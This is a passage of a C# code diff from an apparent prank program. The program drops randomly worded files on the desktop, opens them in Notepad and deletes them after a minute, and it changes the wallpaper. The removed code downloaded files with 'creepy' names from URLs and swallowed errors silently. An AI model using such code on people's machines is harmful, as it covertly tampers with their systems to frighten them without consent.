+        string path = Path.Combine(desktop, name);
+        string content = contents[RNG.Next(contents.Length)];
+
+        File.WriteAllText(path, content);
+        Process.Start("notepad.exe", path);
+
+        // Delete it after 60 seconds while it's still open
+        Thread.Sleep(60 * 1000);
+        TryDelete(path);
+    }
+
+    // ─── Wallpaper helpers ────────────────────────────────────────────────────
+    static void SetWallpaper(string path)
+    {
+        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+    }
+
+    static string GetCurrentWallpaper()
+    {
         try
         {
-            var random = new Random();
-            string url = urls[random.Next(urls.Length)];
-            string ext = Path.GetExtension(url) ?? ".jpg";
-            string name = $"{creepyNames[random.Next(creepyNames.Length)]}_{DateTime.Now:HHmm}{ext}";
-            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), name);
-
-            using (var client = new WebClient())
-            {
-                // Simulate slow download for creepier effect
-                client.DownloadProgressChanged += (s, e) =>
-                    Console.WriteLine($"Downloading... {e.ProgressPercentage}%");
-
-                client.DownloadFileAsync(new Uri(url), path);
-            }
+            using var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop");
+            return key?.GetValue("WallPaper")?.ToString() ?? "";
         }
-        catch
-        {
-            // Silent fail
-        }
+        catch { return ""; }
+    }
+
+    // ─── Utility ──────────────────────────────────────────────────────────────
+    static void TryDelete(string path)
+    {
+        try { if (File.Exists(path)) File.Delete(path); } catch { }
     }
 }
-
-
